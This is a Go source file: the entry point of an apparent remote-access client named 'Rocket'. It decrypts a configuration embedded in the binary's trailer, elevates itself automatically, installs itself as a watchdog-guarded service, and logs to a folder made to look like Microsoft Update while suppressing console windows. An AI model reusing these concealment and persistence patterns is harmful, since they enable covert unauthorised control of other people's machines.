package main

import (
	"Rocket/client/config"
	"Rocket/client/core"
	"Rocket/client/lifecycle"
	"Rocket/client/telemetry"
	"Rocket/utils"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/kataras/golog"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

func init() {
	golog.SetTimeFormat(`2006/01/02 15:04:05`)
	initLogging()
	golog.Info(`client init start`)

	rawBuffer, err := config.RawConfig()
	if err != nil || len(rawBuffer) < 2 {
		golog.Errorf("config trailer load failed: %v", err)
		os.Exit(1)
		return
	}
	dataLen := int(binary.BigEndian.Uint16(rawBuffer[:2]))
	if dataLen <= 0 || dataLen > len(rawBuffer)-2 {
		golog.Errorf("config trailer length invalid: %d", dataLen)
		os.Exit(1)
		return
	}
	cfgBytes := rawBuffer[2 : 2+dataLen]
	cfgBytes, err = decrypt(cfgBytes[16:], cfgBytes[:16])
	if err != nil {
		golog.Errorf("config decrypt failed: %v", err)
		os.Exit(1)
		return
	}
	err = utils.JSON.Unmarshal(cfgBytes, &config.Config)
	if err != nil {
		golog.Errorf("config unmarshal failed: %v", err)
		os.Exit(1)
		return
	}
	if len(config.Config.Path) == 0 {
		config.Config.Path = `/`
	} else if !strings.HasPrefix(config.Config.Path, `/`) {
		config.Config.Path = `/` + config.Config.Path
	}
	if len(config.Config.Path) > 1 && strings.HasSuffix(config.Config.Path, `/`) {
		config.Config.Path = config.Config.Path[:len(config.Config.Path)-1]
	}
	golog.Infof("config loaded host=%s port=%d secure=%v path=%s", config.Config.Host, config.Config.Port, config.Config.Secure, config.Config.Path)
}

func main() {
	golog.Info(`client main start`)
	// Handle update mechanism first (preserve existing logic)
	if len(os.Args) > 1 && (os.Args[1] == `--update` || os.Args[1] == `--clean`) {
		update()
		return
	}

	// Elevate automatically when needed so service install succeeds on double-click.
	lifecycle.EnsureElevated()

	// Detect run mode
	mode := lifecycle.DetectMode(os.Args)

	// For update mode, run the update function
	if mode == lifecycle.RunModeUpdate {
		update()
		return
	}

	// Start observability HTTP server (metrics + health)
	// Only start in service mode to avoid port conflicts
	if mode == lifecycle.RunModeService {
		go startObservabilityServer()
	}

	// Create application wrapper
	app := &rocketApp{}

	// Create platform-specific components
	installer := lifecycle.NewInstaller()
	svcCtrl := lifecycle.NewServiceController(installer.GetInstallPath())

	// Run based on mode
	runner := lifecycle.NewRunner(app, installer, svcCtrl)
	// Start watchdog only for the service host so worker sessions do not
	// compete with SCM-managed restarts.
	if mode == lifecycle.RunModeService {
		lifecycle.StartWatchdog(installer, svcCtrl)
	}
	if err := runner.Run(mode); err != nil {
		golog.Error(err)
		os.Exit(1)
	}
}

// startObservabilityServer starts HTTP server for /metrics and /health endpoints
func startObservabilityServer() {
	mux := http.NewServeMux()

	// Prometheus metrics endpoint
	mux.Handle("/metrics", promhttp.Handler())

	// Health check endpoint
	mux.HandleFunc("/health", healthHandler)

	// Readiness endpoint (similar to health but stricter)
	mux.HandleFunc("/ready", readinessHandler)

	server := &http.Server{
		Addr:         ":9090",
		Handler:      mux,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	golog.Info("observability server starting on :9090")
	golog.Info("  - /metrics (Prometheus metrics)")
	golog.Info("  - /health (health check)")
	golog.Info("  - /ready (readiness check)")

	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		golog.Errorf("observability server error: %v", err)
	}
}

// healthHandler provides health status
func healthHandler(w http.ResponseWriter, r *http.Request) {
	health := telemetry.GetHealth()
	snapshot := health.GetSnapshot()

	// Return 503 if not healthy
	statusCode := http.StatusOK
	if !snapshot.IsHealthy() {
		statusCode = http.StatusServiceUnavailable
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(snapshot)
}

// readinessHandler provides readiness status (stricter than health)
func readinessHandler(w http.ResponseWriter, r *http.Request) {
	health := telemetry.GetHealth()
	snapshot := health.GetSnapshot()

	// Ready only if WebSocket is connected AND UI is running (if session is active)
	ready := snapshot.WSConnected && (snapshot.UIProcessRunning || snapshot.ActiveSessionID == 0)

	statusCode := http.StatusOK
	if !ready {
		statusCode = http.StatusServiceUnavailable
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"ready":           ready,
		"ws_connected":    snapshot.WSConnected,
		"ui_running":      snapshot.UIProcessRunning,
		"active_session":  snapshot.ActiveSessionID,
		"uptime_seconds":  snapshot.UptimeSeconds,
	})
}

// rocketApp implements lifecycle.Application
type rocketApp struct{}

func (s *rocketApp) Run(ctx context.Context) error {
	return core.StartWithContext(ctx)
}

func update() {
	selfPath, err := os.Executable()
	if err != nil {
		selfPath = os.Args[0]
	}
	if len(os.Args) > 1 && os.Args[1] == `--update` {
		if len(selfPath) <= 4 {
			return
		}
		destPath := selfPath[:len(selfPath)-4]
		thisFile, err := os.ReadFile(selfPath)
		if err != nil {
			return
		}
		os.WriteFile(destPath, thisFile, 0755)
		cmd := exec.Command(destPath, `--clean`)
		if cmd.Start() == nil {
			os.Exit(0)
			return
		}
	}
	if len(os.Args) > 1 && os.Args[1] == `--clean` {
		<-time.After(3 * time.Second)
		os.Remove(selfPath + `.tmp`)
	}
}

func decrypt(data []byte, key []byte) ([]byte, error) {
	// MD5[16 bytes] + Data[n bytes]
	dataLen := len(data)
	if dataLen <= 16 {
		return nil, utils.ErrEntityInvalid
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, data[:16])
	decBuffer := make([]byte, dataLen-16)
	stream.XORKeyStream(decBuffer, data[16:])
	hash, _ := utils.GetMD5(decBuffer)
	if !bytes.Equal(hash, data[:16]) {
		return nil, utils.ErrFailedVerification
	}
	return decBuffer[:dataLen-16], nil
}

func initLogging() {
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	logDir := filepath.Join(programData, "Microsoft", "Update")
	logPath := filepath.Join(logDir, "client.log")

	golog.SetLevel("info")

	// Try primary log location
	if err := os.MkdirAll(logDir, 0755); err == nil {
		if f, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644); err == nil {
			golog.SetOutput(f)
			golog.Infof("Logging to %s", logPath)
			return
		}
	}

	// Fallback to temp dir
	fallback := filepath.Join(os.TempDir(), "rocket_client.log")
	if f, err := os.OpenFile(fallback, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644); err == nil {
		golog.SetOutput(f)
		golog.Infof("Logging to %s (fallback)", fallback)
		return
	}

	// Last resort: discard logging to prevent console window flash
	golog.SetOutput(io.Discard)
	// Note: Can't log this message since output is discarded
}
